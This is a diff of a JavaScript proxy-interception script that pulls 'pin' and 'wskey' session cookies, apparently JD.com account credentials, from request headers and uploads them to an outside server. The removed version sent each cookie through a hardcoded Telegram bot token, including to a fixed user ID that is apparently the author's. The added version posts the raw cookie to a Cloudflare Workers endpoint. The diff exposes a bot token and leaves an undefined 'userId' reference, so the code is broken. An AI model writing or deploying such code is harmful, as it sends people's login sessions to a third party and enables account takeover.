@@ -27,13 +27,6 @@ let CK = $request.headers['Cookie'] || $request.headers['cookie'];
 
 const pin = CK.match(/pin=([^=;]+?);/)[1];
 const key = CK.match(/wskey=([^=;]+?);/)[1];
-const _TGUserID = $.getData('id77_TGUserID');
-
-$.TGBotToken = '1825234231:AAEcJUh6jJ93zDd19XH9fl2cSzPiNVBX4xI';
-$.TGUserIDs = [431789620];
-if (_TGUserID) {
-  $.TGUserIDs.push(_TGUserID);
-}
 
 !(async () => {
   if (!pin || !key) {
@@ -88,12 +81,9 @@ if (_TGUserID) {
     //   '',
     //   tipPrefix + cookieName + 'Cookie成功 🎉'
     // );
-
     if ($.needUpload) {
-      for (const userId of $.TGUserIDs) {
-        await updateCookie(cookie, userId);
-        await showMsg(userId);
-      }
+      await updateCookie(cookie);
+      await showMsg(userId);
     } else {
       console.log(`🍪wskey 没有改变`);
     }
@@ -111,14 +101,14 @@ if (_TGUserID) {
   .catch((e) => $.logErr(e))
   .finally(() => $.done());
 
-function updateCookie(cookie, TGUserID) {
+function updateCookie(cookie) {
   return new Promise((resolve) => {
     const opts = {
-      url: `https://api.telegram.org/bot${$.TGBotToken}/sendMessage`,
+      url: `https://little-hall-6e3f.id77.workers.dev/upCar`,
       headers: {
         'Content-Type': 'application/x-www-form-urlencoded',
       },
-      body: `chat_id=${TGUserID}&text=${cookie}&disable_web_page_preview=true`,
+      body: `text=${cookie}`,
     };
 
     $.post(opts, (err, resp, data) => {
